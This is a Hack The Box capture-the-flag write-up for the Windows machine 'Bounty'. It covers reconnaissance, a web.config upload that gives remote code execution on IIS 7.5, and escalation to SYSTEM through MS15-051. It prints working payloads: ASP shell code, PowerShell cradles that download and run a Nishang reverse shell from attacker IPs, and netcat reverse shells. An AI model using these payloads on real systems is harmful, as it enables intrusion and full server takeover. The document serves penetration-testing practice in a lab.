# HTB - Bounty  10.10.10.93

- Microsoft Windows Server 2008 R2 Datacenter 
- 6.1.7600 N/A Build 7600
- No hotfix

- IIS 7 

- Find an upload page with gobuster
- Upload IIS 7 web.config RCS
- MS15-051 : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051: impec
- ms10_092_schelevator ?


## Walkthrough
- https://www.boiteaklou.fr/HackTheBox-Bounty.html


## Nmap -> IIS 7.5

````
nmap -sC -sV 10.10.10.93
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
````
=> 80 : IIS 7.5


## IIS 7.5

![](images/http:__10.10.10.93:80.png)
Browse /<>

## dirb
````
dirb http://192.168.1.11 /usr/share/dirb/wordlists/vulns/iis.txt
````


## gobuster

````
gobuster -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .aspx,.asp,.html

$ gobuster -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -o gobuster/bounty

````

=> http://10.10.10.93//transfer.aspx
![](images/http:__10.10.10.93:80_transfer.aspx.png)

## /transfert.aspx web.config

### IIS 7 web.config upload RCE

Googling “IIS 7.5 upload RCE” teaches us that ASP code can be executed by uploading a file called web.config.
RCE description : https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/

Upload web.config

Info on IIS 7 web.config : https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/

Note : Looks like upload .htaccess files attack : https://github.com/wireghoul/htshells

````
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Response.write("-"&"->")
Response.write(1+2)
Response.write("<!-"&"-")
%>

````

````
http://10.10.10.93/uploadfiles/web.config
--> 3
````
Working


### Payload : whoami
````
<!–-
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("whoami")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
-–>
````

Note : Payload in powershell
````
<%
on error resume next
Dim oS,output
Set oS = Server.CreateObject("WSCRIPT.SHELL")
output = oS.exec("cmd.exe > /c powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.13.75:8080/G783OPiDR3Em');").stdout.readall
Response.write("Powershell: " & vbCrLf & output & vbCrLf & vbCrLf)
%>
````


### Payload : download & execute Nishang

Copy Nishang and set a reverse nc command
````
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.32:8000/Invoke-PowerShellTcp.ps1')")
%>
````

Serve Nishang with python 
```
# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.93 - - [14/Sep/2019 23:33:07] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

Get reverse shell
```
# nc -lvp 4444
listening on [any] 4444 ...
10.10.10.93: inverse host lookup failed: Unknown host
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.93] 49159
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
```


attrib *.* -h -s  : affiche les fichiers cachés
type user.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXx

## Escalation

### Powershell version
```
> $PSVersionTable

Name                           Value                                           
----                           -----                                           
CLRVersion                     2.0.50727.4927                                  
BuildVersion                   6.1.7600.16385                                  
PSVersion                      2.0                                             
WSManStackVersion              2.0                                             
PSCompatibleVersions           {1.0, 2.0}                                      
SerializationVersion           1.1.0.1                                         
PSRemotingProtocolVersion      2.1     
```


### Sherlock reco.. do nothing...

serve Sherlock
````
wget  https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
python -m SimpleHTTPServer
````

Download & run it from PS shell
````
IEX (New-Object Net.WebClient).downloadString('http://10.10.14.32:8000/Sherlock.ps1')
````
????



### MS15-051 :Good exploit

Wget exploit
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
MS15-051-KB3045171
wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip


Transfert file
(New-Object Net.WebClient).DownloadFile('http://10.10.14.32:8000/ms15-051x64.exe', 'c:\windows\temp\priv.exe')

Transfert64bit nc
(New-Object Net.WebClient).DownloadFile('http://10.10.14.32:8000/nc64.exe', 'c:\windows\temp\nc.exe')


Exploit
cd c:\windows\temp\
./priv.exe "c:\windows\temp\nc.exe -e cmd 10.10.14.32 4444"

```
# nc -lvp 4444
listening on [any] 4444 ...
10.10.10.93: inverse host lookup failed: Unknown host
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.93] 49167
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\windows\temp>whoami
whoami
nt authority\system

```


### Other exploit : ms10_092_schelevator.. à tester


Get wordlist from site
# cewl -w bobby_words.txt -v http://192.168.1.11

